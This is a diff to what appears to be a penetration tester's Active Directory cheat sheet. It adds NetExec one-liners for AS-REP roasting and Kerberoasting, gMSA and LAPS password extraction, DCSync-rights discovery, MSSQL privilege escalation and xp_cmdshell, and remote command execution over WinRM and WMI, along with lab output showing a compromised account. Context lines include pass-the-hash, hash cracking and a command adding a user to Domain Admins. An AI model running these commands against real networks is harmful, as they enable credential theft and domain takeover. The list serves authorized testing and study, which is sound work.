@@ -65,7 +65,7 @@ hashcat -m 18200 --force -a 0 hash /usr/share/wordlists/rockyou.txt # asreproast
 
 impacket-GetUserSPNs 'domain/user:password' -dc-ip $IP -request # kerberoasting
 
-# SMB NXC
+# NXC SMB 
 nxc IP/24 -u USER -d DOMAIN -p PASSWD 	# pass the creds
 nxc IP/24 -u "USER" -H HASH --local 	# pass the hash
 nxc smb 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth  # Connect to target using local account
@@ -142,9 +142,68 @@ nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users	# Enumerate logged-o
 nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>	# Execute commands on behalf of other users 2 (Enumerate logged-on users first)
 nxc smb [] -u [] -p [] --local-auth -M schtask_as -o USER=[target] CMD="whoami" TASK="Windows Update Service" FILE="update.log" LOCATION="\\Windows\\Tasks\\"	# Execute commands on behalf of other users 2 (Enumerate logged-on users first) | CMD: Command to execute | USER:User to execute command as | TASK:OPTIONAL: Set a name for the scheduled task name | FILE:OPTIONAL: Set a name for the command output file | LOCATION :OPTIONAL: Set a location for the command output file
 nxc smb <ip> -u user -p pass -M security-questions	# dump a local user's security questions
+nxc ldap 192.168.0.104 -u harry -p '' --asreproast output.txt    #  Retrieve the Kerberos 5 AS-REP etype 23 hash of users without Kerberos pre-authentication required
+nxc ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid     #  List All PKI Enrollment Servers
+nxc ldap <ip> -u user -p pass -M adcs -o SERVER=xxxx    # List All Certificates Inside a PKI
 
-# LDAP NXC
 
+
+
+# NXC LDAP 
+nxc ldap 192.168.1.0/24 -u users.txt -p '' -k      # Testing if an account exists without kerberos protocol
+nxc ldap $ip -u $user -p $password --users        #  Enumerate Domain Users
+nxc ldap <ip> -u <username> -p <password> --groups   # Enumerate all groups in the Domain
+nxc ldap <ip> -u username -p password --query "(sAMAccountName=Administrator)" ""  # Query LDAP
+nxc ldap 192.168.0.104 -u harry -p '' --asreproast output.txt    #  Retrieve the Kerberos 5 AS-REP etype 23 hash of users without Kerberos pre-authentication required
+nxc ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid      # Find Domain SID
+nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt    # Retrieve the Kerberos 5 TGS-REP etype 23 hash using Kerberoasting
+nxc ldap 192.168.56.11 -u eddard.stark -p FightP3aceAndHonor! --find-delegation    # Find Misconfigured Delegation
+nxc ldap 192.168.0.104 -u harry -p pass --trusted-for-delegation    # retrieve the list of all computers and users with the flag TRUSTED_FOR_DELEGATION
+nxc ldap <ip> -u user -p pass -M maq    #  retrieves the MachineAccountQuota domain-level attribute
+nxc ldap <hostname> -u <user> -p <pass> -M get-desc-users   #   Get User Descriptions
+nxc ldap <ip> -u <user> -p <pass> --gmsa    # extract the password of a gMSA account if you have the right
+nxc ldap <ip> -u user -p pass -M adcs    # List All Certificates Inside a PKI
+nxc ldap <ip> -u <user> -p <pass> -M get-network     # Extract subnet over an active directory environment
+nxc ldap <ip> -u user -p pass -M ldap-checker   #   verify if ldap require channel binding or not
+nxc ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET=Administrator ACTION=read     # permits to read and export the DACLs of one or mulitple objects
+nxc ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET_DN="DC=lab,DC=LOCAL" ACTION=read RIGHTS=DCSync  # Read all the principals that have DCSync rights on the domain
+nxc ldap <ip> -u <user> -p <pass> --gmsa-convert-id 313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724   # Convert gSAM id,
+nxc ldap <ip> -u <user> -p <pass> --gmsa-decrypt-lsa '_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724:01000000240200001000120114021c02fbb096d10991bb88c3f54e153807b4c1cc009d30bc3c50fd6f72c99a1e79f27bd0cbd4df69fdf08b5cf6fa7928cf6924cf55bfd8dd505b1da26ddf5695f5333dd07d08673029b01082e548e31f1ad16c67db0116c6ab0f8d2a0f6f36ff30b160b7c78502d5df93232f72d6397b44571d1939a2d18bb9c28a5a48266f52737c934669e038e22d3ba5a7ae63a608f3074c520201f372d740fddec77a8fed4ddfc5b63ce7c4643b60a8c4c739e0d0c7078dd0c2fcbc2849e561ea2de1af7a004b462b1ff62ab4d3db5945a6227a58ed24461a634b85f939eeed392cf3fe9359f28f3daa8cb74edb9eef7dd38f44ed99fa7df5d10ea1545994012850980a7b3becba0000d22d957218fb7297b216e2d7272a4901f65c93ee0dbc4891d4eba49dda5354b0f2c359f185e6bb943da9bcfbd2abda591299cf166c28cb36907d1ba1a8956004b5e872ef851810689cec9578baae261b45d29d99aef743f3d9dcfbc5f89172c9761c706ea3ef16f4b553db628010e627dd42e3717208da1a2902636d63dabf1526597d94307c6b70a5acaf4bb2a1bdab05e38eb2594018e3ffac0245fcdb6afc5a36a5f98f5910491e85669f45d02e230cb633a4e64368205ac6fc3b0ba62d516283623670b723f906c2b3d40027791ab2ae97a8c5c135aae85da54a970e77fb46087d0e2233d062dcd88f866c12160313f9e6884b510840e90f4c5ee5a032d40000f0650a4489170000f0073a9188170000'    #  convert gmsa lsa to ntlm
+nxc ldap <ip> -u user -p pass --bloodhound --collection All  # Bloodhound Ingestor
+nxc ldap <ip> -u user -p pass --dc-list     # listing Domain Controllers and finds IP Addresses
+nxc ldap <ip> -u user -p pass -M enum_trusts   # Identify Trust Relationships and Direction
+nxc ldap 192.168.33.10 u alice -p whiteRabbit -M sccm -o REC_RESOLVE=TRUE    # find SCCM Site-Servers, SCCM Sites, SCCM Management Points and Users, Computers or Groups related to SCCM
+
+# NXC NXC WINRM
+nxc winrm 192.168.255.131 -u user -p 'password' -X whoami   # Execute Command using WinRM
+nxc winrm <ip> -u user-can-read-laps -p pass --laps   #  compromised an accout that can read LAPS password
+
+# NXC MSSQL
+nxc mssql 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!' -d HTB  # With SMB port close, add the flag -d DOMAIN
+nxc mssql <ip> -u user -p password -M mssql_priv     # mssql_priv Module "FQDN\user can impersonate: sa (sysadmin)"
+nxc mssql <ip> -u user -p password -M mssql_priv -o ACTION=privesc     # Impersonating 
+nxc mssql <ip> -u user -p password -M mssql_priv -o ACTION=rollback    # rollback sysadmin privs in production
+nxc mssql 10.10.10.52 -u admin -p 'm$$ql_S@_P@ssW0rd!' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'   # Execute MSSQL commands
+nxc mssql 10.10.10.52 -u admin -p 'm$$ql_S@_P@ssW0rd!' --put-file /tmp/users C:\\Windows\\Temp\\whoami.txt  # Upload MSSQL file
+nxc mssql 10.10.10.52 -u admin -p 'm$$ql_S@_P@ssW0rd!' --get-file C:\\Windows\\Temp\\whoami.txt /tmp/file   # Download MSSQL file
+nxc mssql 10.10.10.59 -u sa -p 'GWE3V65#6KFH93@4GWTG2G' --local-auth -x whoami    # use xp_cmdshell to exec command on the remote host
+nxc mssql 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --rid-brute    # Enumerate users by bruteforcing the RID on the remote target
+
+# NXC WMI
+nxc wmi 192.168.255.131 -u user -p 'password' -x whoami   # Execute Command using WMI
+
+
+# Example Output
+
+SMB    192.168.56.11   445   WINTERFELL   [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+LDAP   192.168.56.11   389   WINTERFELL   [+] north.sevenkingdoms.local\eddard.stark:FightP3aceAndHonor! (Pwn3d!)
+LDAP   192.168.56.11   389   WINTERFELL   AccountName  AccountType DelegationType                     DelegationRightsTo
+LDAP   192.168.56.11   389   WINTERFELL   ------------ ----------- ---------------------------------- ----------------------------------------------------------------
+LDAP   192.168.56.11   389   WINTERFELL   sansa.stark  Person      Unconstrained                      N/A
+LDAP   192.168.56.11   389   WINTERFELL   jon.snow     Person      Constrained w/ Protocol Transition CIFS/winterfell, CIFS/winterfell.north.sevenkingdoms.local
+LDAP   192.168.56.11   389   WINTERFELL   jon.snow     Person      Resource-Based Constrained         RBCD-COMPUTER$
+LDAP   192.168.56.11   389   WINTERFELL   CASTELBLACK$ Computer    Constrained                        HTTP/winterfell, HTTP/winterfell.north.sevenkingdoms.local
+LDAP   192.168.56.11   389   WINTERFELL   пользователь Person      Resource-Based Constrained         WINTERFELL$
 
 powershell.exe \"Invoke-Command -ComputerName DC01 -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members USER.NAME}\"	# Custom command to add a user to the domain admin group for easy copy&pasting
 
